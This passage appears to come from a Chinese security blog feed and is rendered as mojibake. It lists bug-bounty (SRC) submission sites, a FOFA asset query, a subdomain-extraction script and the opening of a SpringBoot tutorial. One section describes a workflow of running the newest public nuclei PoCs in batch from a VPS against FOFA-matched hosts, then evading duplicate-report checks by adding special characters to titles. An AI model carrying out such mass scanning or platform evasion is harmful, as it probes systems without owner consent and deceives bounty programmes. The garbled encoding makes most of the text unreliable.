<td align="center"><a href="http://src.100tal.com/">http://src.100tal.com/</a></td>
</tr>
<tr>
<td align="center">åä¸ºå®‰å…¨æ¿€åŠ±è®¡åˆ’</td>
<td align="center"><a href="https://bugbounty.huawei.com/">https://bugbounty.huawei.com/</a></td>
</tr>
<tr>
<td align="center">ç„¦ç‚¹å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://security.focuschina.com/home/index/report.html">https://security.focuschina.com/home/index/report.html</a></td>
</tr>
<tr>
<td align="center">ç«æŠ€å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://security.jj.cn/">https://security.jj.cn/</a></td>
</tr>
<tr>
<td align="center">å¿«æ‰‹å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://security.kuaishou.com/#/submit">https://security.kuaishou.com/#/submit</a></td>
</tr>
<tr>
<td align="center">è”æƒ³å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://lsrc.vulbox.com/">https://lsrc.vulbox.com/</a></td>
</tr>
<tr>
<td align="center">åŒç¨‹æ—…è¡Œå®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://sec.ly.com/">https://sec.ly.com/</a></td>
</tr>
<tr>
<td align="center">ç¾ä¸½è”åˆé›†å›¢å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="http://security.mogujie.com/#/">http://security.mogujie.com/#/</a></td>
</tr>
<tr>
<td align="center">é­…æ—å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://sec.meizu.com/">https://sec.meizu.com/</a></td>
</tr>
<tr>
<td align="center">é™Œé™Œå®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://security.immomo.com/">https://security.immomo.com/</a></td>
</tr>
<tr>
<td align="center">é©¬èœ‚çªå®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://security.mafengwo.cn/submit">https://security.mafengwo.cn/submit</a></td>
</tr>
<tr>
<td align="center">ç¾å›¢å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://security.meituan.com/">https://security.meituan.com/</a></td>
</tr>
<tr>
<td align="center">OPPOå®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://security.oppo.com/add.jsp">https://security.oppo.com/add.jsp</a></td>
</tr>
<tr>
<td align="center">ç½‘æ˜“å®‰å…¨ä¸­å¿ƒ</td>
<td align="center"><a href="http://anquan.163.com/module/hole/new-hole.html">http://anquan.163.com/module/hole/new-hole.html</a></td>
</tr>
<tr>
<td align="center">å¹³å®‰å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="http://security.pingan.com/submit">http://security.pingan.com/submit</a></td>
</tr>
<tr>
<td align="center">å»å“ªå„¿å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://security.qunar.com/report.php">https://security.qunar.com/report.php</a></td>
</tr>
<tr>
<td align="center">è360å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://security.rong360.com/#/leak/add">https://security.rong360.com/#/leak/add</a></td>
</tr>
<tr>
<td align="center">çŸ¥é“åˆ›å®‡å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://www.seebug.org/">https://www.seebug.org/</a></td>
</tr>
<tr>
<td align="center">æ–°æµªå®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="http://sec.sina.com.cn/">http://sec.sina.com.cn/</a></td>
</tr>
<tr>
<td align="center">è‹å®å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://security.suning.com/">https://security.suning.com/</a></td>
</tr>
<tr>
<td align="center">é€”ç‰›å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="http://sec.tuniu.com/">http://sec.tuniu.com/</a></td>
</tr>
<tr>
<td align="center">T3å‡ºè¡Œå®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://security.t3go.cn/">https://security.t3go.cn/</a></td>
</tr>
<tr>
<td align="center">å”¯å“ä¼šå®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://sec.vip.com/">https://sec.vip.com/</a></td>
</tr>
<tr>
<td align="center">vivoå®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://security.vivo.com.cn/#/bugsubmit">https://security.vivo.com.cn/#/bugsubmit</a></td>
</tr>
<tr>
<td align="center">æŒ–è´¢å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://sec.wacai.com/">https://sec.wacai.com/</a></td>
</tr>
<tr>
<td align="center">å¾®åšå®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="http://wsrc.weibo.com/leak_module_view">http://wsrc.weibo.com/leak_module_view</a></td>
</tr>
<tr>
<td align="center">å¾®ä¼—é“¶è¡Œå®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://security.webank.com/report/add">https://security.webank.com/report/add</a></td>
</tr>
<tr>
<td align="center">å®Œç¾ä¸–ç•Œå®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="http://security.wanmei.com/">http://security.wanmei.com/</a></td>
</tr>
<tr>
<td align="center">å°ç±³å®‰å…¨ä¸­å¿ƒ</td>
<td align="center"><a href="https://sec.xiaomi.com/submit">https://sec.xiaomi.com/submit</a></td>
</tr>
<tr>
<td align="center">å°èµ¢å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://security.xiaoying.com/user.php?m=user&c=post&a=add">https://security.xiaoying.com/user.php?m=user&amp;c=post&amp;a=add</a></td>
</tr>
<tr>
<td align="center">å–œé©¬æ‹‰é›…å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://security.ximalaya.com/">https://security.ximalaya.com/</a></td>
</tr>
<tr>
<td align="center">æºç¨‹å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://sec.ctrip.com/report">https://sec.ctrip.com/report</a></td>
</tr>
<tr>
<td align="center">è®¯é£å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://security.iflytek.com/user.php/post/add">https://security.iflytek.com/user.php/post/add</a></td>
</tr>
<tr>
<td align="center">æœ‰èµå®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://src.youzan.com/">https://src.youzan.com/</a></td>
</tr>
<tr>
<td align="center">é“¶è”å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://security.unionpay.com/">https://security.unionpay.com/</a></td>
</tr>
<tr>
<td align="center">å®œä¿¡å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://security.creditease.cn/bugReport.html">https://security.creditease.cn/bugReport.html</a></td>
</tr>
<tr>
<td align="center">æ™ºè”æ‹›è˜å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://src.zhaopin.com/#/submitvul">https://src.zhaopin.com/#/submitvul</a></td>
</tr>
<tr>
<td align="center">ä¸­é€šå®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://sec.zto.com/">https://sec.zto.com/</a></td>
</tr>
<tr>
<td align="center">çŒªå…«æˆ’ç½‘å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://sec.zbj.com/">https://sec.zbj.com/</a></td>
</tr>
<tr>
<td align="center">è‡ªå¦‚å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://zrsecurity.ziroom.com/">https://zrsecurity.ziroom.com/</a></td>
</tr>
</tbody></table>
<h2 id="èµ„äº§æµ‹ç»˜"><a href="#èµ„äº§æµ‹ç»˜" class="headerlink" title="èµ„äº§æµ‹ç»˜"></a>èµ„äº§æµ‹ç»˜</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">url: fofa.icu  fofa.info</span><br><span class="line">query: country=&quot;CN&quot; &amp;&amp; (host=&quot;.com&quot; || host=&quot;.cn&quot;) &amp;&amp; </span><br></pre></td></tr></table></figure>

<h2 id="ä¼ä¸šèƒŒè°ƒ"><a href="#ä¼ä¸šèƒŒè°ƒ" class="headerlink" title="ä¼ä¸šèƒŒè°ƒ"></a>ä¼ä¸šèƒŒè°ƒ</h2><ol>
<li>ä¼æŸ¥æŸ¥ï¼š<a href="https://www.qcc.com/">https://www.qcc.com/</a></li>
<li>çˆ±ä¼æŸ¥ï¼š<a href="https://aiqicha.baidu.com/">https://aiqicha.baidu.com/</a></li>
<li>SEOæƒé‡ï¼š<a href="https://github.com/Potato-py/ipInfoSearch">https://github.com/Potato-py/ipInfoSearch</a></li>
</ol>
<h2 id="SRCå¹³å°"><a href="#SRCå¹³å°" class="headerlink" title="SRCå¹³å°"></a>SRCå¹³å°</h2><ol>
<li>æƒé‡ä¸º0ï¼šæ¼æ´ç›’å­-å…¬ç›ŠSRC</li>
<li>æœ‰æƒé‡ï¼šè¡¥å¤©</li>
<li>edu.cnï¼šæ•™è‚²SRC</li>
<li>å¤§å‚ï¼šä¸“å±SRC</li>
</ol>
<h2 id="å¿«é€Ÿå‡ºæ´"><a href="#å¿«é€Ÿå‡ºæ´" class="headerlink" title="å¿«é€Ÿå‡ºæ´"></a>å¿«é€Ÿå‡ºæ´</h2><h3 id="é€šè¿‡Ndayæ‰¾ç›®æ ‡"><a href="#é€šè¿‡Ndayæ‰¾ç›®æ ‡" class="headerlink" title="é€šè¿‡Ndayæ‰¾ç›®æ ‡"></a>é€šè¿‡Ndayæ‰¾ç›®æ ‡</h3><p>åœ¨nuclei pocçš„æ”¶é›†å¹³å°ä¸Š<a href="https://github.com/adysec/nuclei_poc%E4%BB%A5%E6%97%B6%E9%97%B4%E9%A1%BA%E5%BA%8F%E5%80%92%E6%8E%A8%E6%89%BE%E6%9C%80%E6%96%B0%E7%9A%84poc">https://github.com/adysec/nuclei_pocä»¥æ—¶é—´é¡ºåºå€’æ¨æ‰¾æœ€æ–°çš„poc</a>  &#x3D;&#x3D;&gt;  ç„¶åé€šè¿‡FOFAåŒ¹é…èµ„äº§  &#x3D;&#x3D;&gt;  VPSæ‰¹é‡æ¼æ´+äº‘ç«¯ä¸Šä¼   &#x3D;&#x3D;&gt;  å¯¼å‡ºç»“æœ+ipinfoSearchæ‰¹é‡æŸ¥æƒé‡  &#x3D;&#x3D;&gt;  ä¼æŸ¥æŸ¥&#x2F;çˆ±ä¼æŸ¥åšèƒŒè°ƒ  &#x3D;&#x3D;&gt;  æœ‰æƒé‡äº¤è¡¥å¤©ï¼Œæ²¡æƒé‡äº¤ç›’å­  &#x3D;&#x3D;&gt;  å¦‚æœæç¤ºæ¼æ´æ ‡é¢˜å­˜åœ¨ï¼ŒåŠ ä¸Šä¸€äº›ç‰¹æ®Šç¬¦å·è¿›è¡Œç»•è¿‡ã€‚</p>
<ol>
<li>URLæ ¼å¼å¤„ç†ï¼š<a href="http://tools.sbbbb.cn/url-ip/">URL &amp; IP åœ¨çº¿å¤„ç†å·¥å…·</a></li>
</ol>
<h2 id="ç›®æ ‡"><a href="#ç›®æ ‡" class="headerlink" title="ç›®æ ‡"></a>ç›®æ ‡</h2><ol>
<li>å¤§å‚è¾¹ç¼˜èµ„äº§ã€éé‡‘è</li>
<li>æ¼æ´å¤„ç½®è§„åˆ™</li>
</ol>
<h1 id="Day01-å­—èŠ‚SRC"><a href="#Day01-å­—èŠ‚SRC" class="headerlink" title="Day01-å­—èŠ‚SRC"></a>Day01-å­—èŠ‚SRC</h1><blockquote>
<ol>
<li>SRCä¸å¼ºæ±‚æ¼æ´åˆ©ç”¨ï¼Œåªè¦æ˜¯æ¼æ´å°±å¯ä»¥ã€‚å½“ç„¶ï¼Œèƒ½å¤Ÿåˆ©ç”¨é€ æˆæ›´å¤§çš„å±å®³è‚¯å®šæ˜¯æ›´å¥½</li>
<li>SRCä¸­å¸¸è§æ¼æ´ï¼šDOM-XSSã€SSRFã€é€»è¾‘æ¼æ´ã€æœªæˆæƒè®¿é—®</li>
</ol>
</blockquote>
<h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><ol>
<li><p>èµ„äº§æ‰©å……â€”â€”å¤šä¸ªç½‘ç»œç©ºé—´æœç´¢å¼•æ“è”åˆæœç´¢ï¼šä¸»åŸŸåã€faviconã€ç›¸åŒè¯ä¹¦ã€Cæ®µ</p>
</li>
<li><p>å­åŸŸåæå–è„šæœ¬</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> OrderedDict</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_subdomains</span>(<span class="params">file_path, target_domain, include_main=<span class="literal">False</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    ä»æ–‡ä»¶ä¸­æå–æŒ‡å®šåŸŸåä¸‹çš„å­åŸŸå</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    å‚æ•°:</span></span><br><span class="line"><span class="string">        file_path: åŒ…å«URLçš„æ–‡ä»¶è·¯å¾„</span></span><br><span class="line"><span class="string">        target_domain: ç›®æ ‡ä¸»åŸŸå(å¦‚example.com)</span></span><br><span class="line"><span class="string">        include_main: æ˜¯å¦åŒ…å«ä¸»åŸŸåæœ¬èº«</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">    è¿”å›:</span></span><br><span class="line"><span class="string">        å»é‡åçš„å­åŸŸååˆ—è¡¨</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># ç¼–è¯‘æ­£åˆ™è¡¨è¾¾å¼ï¼Œç”¨äºåŒ¹é…ç›®æ ‡åŸŸååŠå…¶å­åŸŸå</span></span><br><span class="line">    <span class="comment"># æ”¯æŒå¸¦ç«¯å£ã€è·¯å¾„ç­‰æƒ…å†µ</span></span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(</span><br><span class="line">        <span class="string">r&#x27;(?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]&#123;0,61&#125;[a-zA-Z0-9])?\.)*?&#x27;</span> + </span><br><span class="line">        re.escape(target_domain) + </span><br><span class="line">        <span class="string">r&#x27;(?::\d+)?(?:/.*)?$&#x27;</span></span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    subdomains = <span class="built_in">set</span>()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">                line = line.strip()</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> line:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                </span><br><span class="line">                <span class="comment"># å°è¯•ä½¿ç”¨urlparseè§£æ</span></span><br><span class="line">                parsed = urlparse(line)</span><br><span class="line">                <span class="keyword">if</span> parsed.netloc:  <span class="comment"># æœ‰ç½‘ç»œä½ç½®éƒ¨åˆ†</span></span><br><span class="line">                    domain = parsed.netloc</span><br><span class="line">                    <span class="comment"># å»é™¤ç«¯å£</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="string">&#x27;:&#x27;</span> <span class="keyword">in</span> domain:</span><br><span class="line">                        domain = domain.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="comment"># æ²¡æœ‰åè®®éƒ¨åˆ†ï¼Œç›´æ¥å¤„ç†</span></span><br><span class="line">                    domain = line.split(<span class="string">&#x27;/&#x27;</span>)[<span class="number">0</span>].split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># æ£€æŸ¥æ˜¯å¦åŒ¹é…ç›®æ ‡åŸŸå</span></span><br><span class="line">                <span class="keyword">if</span> pattern.<span class="keyword">match</span>(domain):</span><br><span class="line">                    <span class="comment"># æå–å®Œæ•´åŸŸå(åŒ…å«å­åŸŸå)</span></span><br><span class="line">                    full_domain = domain</span><br><span class="line">                    </span><br><span class="line">                    <span class="comment"># ç¡®ä¿ä¸åŒ…å«ç«¯å£ä¿¡æ¯</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="string">&#x27;:&#x27;</span> <span class="keyword">in</span> full_domain:</span><br><span class="line">                        full_domain = full_domain.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">                    </span><br><span class="line">                    <span class="comment"># æ£€æŸ¥æ˜¯å¦ä¸ºä¸»åŸŸåæœ¬èº«</span></span><br><span class="line">                    <span class="keyword">if</span> full_domain == target_domain:</span><br><span class="line">                        <span class="keyword">if</span> include_main:</span><br><span class="line">                            subdomains.add(full_domain)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="comment"># ç¡®è®¤æ˜¯ç›®æ ‡åŸŸåçš„å­åŸŸå</span></span><br><span class="line">                        <span class="keyword">if</span> full_domain.endswith(<span class="string">&#x27;.&#x27;</span> + target_domain):</span><br><span class="line">                            subdomains.add(full_domain)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;é”™è¯¯: æ–‡ä»¶ &#x27;<span class="subst">&#123;file_path&#125;</span>&#x27; ä¸å­˜åœ¨&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;å¤„ç†æ–‡ä»¶æ—¶å‡ºé”™: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># æŒ‰é•¿åº¦æ’åºï¼Œä¾¿äºé˜…è¯»</span></span><br><span class="line">    sorted_subdomains = <span class="built_in">sorted</span>(subdomains, key=<span class="keyword">lambda</span> x: (<span class="built_in">len</span>(x.split(<span class="string">&#x27;.&#x27;</span>)), x))</span><br><span class="line">    <span class="keyword">return</span> sorted_subdomains</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;æå–æŒ‡å®šåŸŸåä¸‹çš„å­åŸŸå&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;file&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;åŒ…å«URLçš„æ–‡ä»¶è·¯å¾„&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;domain&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;ç›®æ ‡ä¸»åŸŸå(å¦‚example.com)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-i&#x27;</span>, <span class="string">&#x27;--include-main&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>, </span><br><span class="line">                      <span class="built_in">help</span>=<span class="string">&#x27;æ˜¯å¦åŒ…å«ä¸»åŸŸåæœ¬èº«&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-o&#x27;</span>, <span class="string">&#x27;--output&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;è¾“å‡ºç»“æœåˆ°æ–‡ä»¶&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;æ­£åœ¨ä» <span class="subst">&#123;args.file&#125;</span> ä¸­æå– <span class="subst">&#123;args.domain&#125;</span> çš„å­åŸŸå...&quot;</span>)</span><br><span class="line">    subdomains = extract_subdomains(args.file, args.domain, args.include_main)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> subdomains:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\nå…±æ‰¾åˆ° <span class="subst">&#123;<span class="built_in">len</span>(subdomains)&#125;</span> ä¸ªç‹¬ç‰¹çš„å­åŸŸå:&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> subdomain <span class="keyword">in</span> subdomains:</span><br><span class="line">            <span class="built_in">print</span>(subdomain)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> args.output:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(args.output, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                <span class="keyword">for</span> subdomain <span class="keyword">in</span> subdomains:</span><br><span class="line">                    f.write(subdomain + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\nç»“æœå·²ä¿å­˜åˆ° <span class="subst">&#123;args.output&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\næœªæ‰¾åˆ° <span class="subst">&#123;args.domain&#125;</span> çš„å­åŸŸå&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>SRC</category>
      </categories>
      <tags>
        <tag>SRCæŒ–æ˜æ€è·¯</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBootå…¥é—¨</title>
    <url>/SpringBootDev.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h1 id="å¿«é€Ÿå¯åŠ¨"><a href="#å¿«é€Ÿå¯åŠ¨" class="headerlink" title="å¿«é€Ÿå¯åŠ¨"></a>å¿«é€Ÿå¯åŠ¨</h1><h2 id="äº§å“èƒŒæ™¯"><a href="#äº§å“èƒŒæ™¯" class="headerlink" title="äº§å“èƒŒæ™¯"></a>äº§å“èƒŒæ™¯</h2><ol>
<li><p>Springç”Ÿæ€ä¼—å¤šï¼Œä¸æ­¢ä¸€ä¸¤ä¸ªæ¡†æ¶è€Œå·²ï¼Œä¸‹å›¾æ˜¯ä¸€äº›Springç”Ÿæ€ä¸­æ¯”è¾ƒå‡ºåçš„æ¡†æ¶ã€‚å¯ä»¥çœ‹åˆ°ä»æ•°æ®åº“ã€webã€cloudåˆ°Androidã€LDAPç­‰ç­‰ï¼Œå¾ˆå¤šæ–¹å‘éƒ½æœ‰æ¡†æ¶ã€‚</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251110231515495.png" alt="image-20251110231515495"></p>
</li>
<li><p>SpringFrameworkï¼ˆä»¥ä¸‹ç®€ç§°SFï¼‰æ˜¯Springç”Ÿæ€ä¸­æœ€é‡è¦çš„ä¸€ç¯ã€æ˜¯æœ€æ ¹æœ¬çš„åŸºçŸ³ï¼Œç®€å•ç†è§£Springä¸­å…¶ä»–æ¡†æ¶éƒ½æ¥è‡ªäºSFï¼Œæ‰€ä»¥ä¹Ÿæœ‰å¾ˆå¤šäººæŠŠSFç®€ç§°ä¸ºSpringï¼Œå°±åƒæŠŠDBMSç®€ç§°ä¸ºæ•°æ®åº“æ˜¯ä¸€æ ·çš„é“ç†ã€‚SpringBootï¼ˆä»¥ä¸‹ç®€ç§°SBï¼‰æ˜¯åŸºäºSFï¼Œåœ¨webæ–¹å‘å¼€å‘å‡ºæ¥çš„ä¸€æ¬¾æ¡†æ¶ï¼ˆå…¶å®SFä¸­çš„SpringMVCæœ¬å°±å¯ä»¥å¼€å‘webï¼Œä»¥å‰çš„â€œSSMâ€ä¸‰ä»¶å¥—ï¼Œåªæ˜¯SBæ›´åŠ ä¸“ä¸šï¼Œé€æ¸ä»£æ›¿äº†SSMï¼‰ã€‚SBå¯¹äºå¼€å‘è€…è€Œè¨€æ–¹ä¾¿å¾ˆå¤šï¼Œç°åœ¨Javaåç«¯å‡ ä¹éƒ½é‡‡ç”¨SBè¿›è¡Œå¼€å‘ï¼Œè€Œä¸”å¦‚ä¸‹å›¾æ‰€ç¤ºï¼ŒSBè¿˜å¯ä»¥å’Œå…¶ä»–çš„ä¸€äº›å·¥å…·&#x2F;æ¡†æ¶ç›¸ç»“åˆï¼Œä½¿å¾—webæ¡†æ¶å¯å®šåˆ¶åŒ–ç¨‹åº¦æ›´é«˜ï¼Œæ›´åŠ å—åˆ°å¼€å‘è€…çš„é’çã€‚</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251110224226584.png" alt="image-20251110224226584"></p>
</li>
<li><p>SBä¸SFçš„å¯¹åº”å…³ç³»</p>
<table>
<thead>
<tr>
<th align="center">Spring Boot ç‰ˆæœ¬</th>
<th align="center">å¯¹åº”çš„ Spring Framework ç‰ˆæœ¬èŒƒå›´</th>
<th align="center">å‘å¸ƒæ—¶é—´</th>
<th align="center">æ”¯æŒçŠ¶æ€</th>
</tr>
</thead>
<tbody><tr>
<td align="center">3.3.x</td>
<td align="center">6.2.x</td>
<td align="center">2024 å¹´</td>
<td align="center">æœ€æ–°ç‰ˆæœ¬ï¼ŒæŒç»­æ›´æ–°</td>
</tr>
<tr>
<td align="center">3.2.x</td>
<td align="center">6.1.x</td>
<td align="center">2023 å¹´åº•</td>
<td align="center">æ´»è·ƒæ”¯æŒä¸­ï¼ˆOSS æ”¯æŒè‡³ 2025 å¹´ï¼‰</td>
</tr>
<tr>
<td align="center">3.1.x</td>
<td align="center">6.0.x</td>
<td align="center">2023 å¹´</td>
<td align="center">å·²åœæ­¢ OSS æ”¯æŒï¼Œå•†ä¸šæ”¯æŒä¸­</td>
</tr>
<tr>
<td align="center">3.0.x</td>
<td align="center">6.0.xï¼ˆæ—©æœŸç‰ˆæœ¬ï¼‰</td>
<td align="center">2022 å¹´åº•</td>
<td align="center">å·²åœæ­¢æ”¯æŒ</td>
</tr>
<tr>
<td align="center">2.7.xï¼ˆLTSï¼‰</td>
<td align="center">5.3.x</td>
<td align="center">2021 å¹´</td>
<td align="center">é•¿æœŸæ”¯æŒï¼ˆè‡³ 2025 å¹´ 11 æœˆï¼‰</td>
</tr>
<tr>
<td align="center">2.6.x</td>
<td align="center">5.3.x</td>
<td align="center">2021 å¹´</td>
<td align="center">å·²åœæ­¢æ”¯æŒ</td>
</tr>
<tr>
<td align="center">2.5.x</td>
<td align="center">5.3.x</td>
<td align="center">2021 å¹´</td>
<td align="center">å·²åœæ­¢æ”¯æŒ</td>
</tr>
<tr>
<td align="center">2.4.x</td>
<td align="center">5.3.x</td>
<td align="center">2020 å¹´</td>
<td align="center">å·²åœæ­¢æ”¯æŒ</td>
</tr>
<tr>
<td align="center">2.3.x</td>
<td align="center">5.2.x</td>
<td align="center">2020 å¹´</td>
<td align="center">å·²åœæ­¢æ”¯æŒ</td>
</tr>
<tr>
<td align="center">2.2.x</td>
<td align="center">5.2.x</td>
<td align="center">2019 å¹´</td>
<td align="center">å·²åœæ­¢æ”¯æŒ</td>
</tr>
<tr>
<td align="center">2.1.xï¼ˆLTSï¼‰</td>
<td align="center">5.1.x</td>
<td align="center">2018 å¹´</td>
<td align="center">å·²åœæ­¢æ”¯æŒ</td>
</tr>
<tr>
<td align="center">2.0.x</td>
<td align="center">5.0.x</td>
<td align="center">2018 å¹´</td>
<td align="center">å·²åœæ­¢æ”¯æŒ</td>
</tr>
<tr>
<td align="center">1.5.xï¼ˆLTSï¼‰</td>
<td align="center">4.3.x</td>
<td align="center">2017 å¹´</td>
<td align="center">å·²åœæ­¢æ”¯æŒ</td>
</tr>
</tbody></table>
</li>
</ol>
<h2 id="å¯åŠ¨é¡¹ç›®"><a href="#å¯åŠ¨é¡¹ç›®" class="headerlink" title="å¯åŠ¨é¡¹ç›®"></a>å¯åŠ¨é¡¹ç›®</h2><ol>
<li><p>é€šè¿‡SpringBootï¼ˆä»¥ä¸‹ç®€ç§°SBï¼‰æ’ä»¶å¿«é€Ÿåˆ›å»ºSBé¡¹ç›®</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251110224213490.png" alt="image-20251110224213490"></p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251110224226584.png" alt="image-20251110224226584"></p>
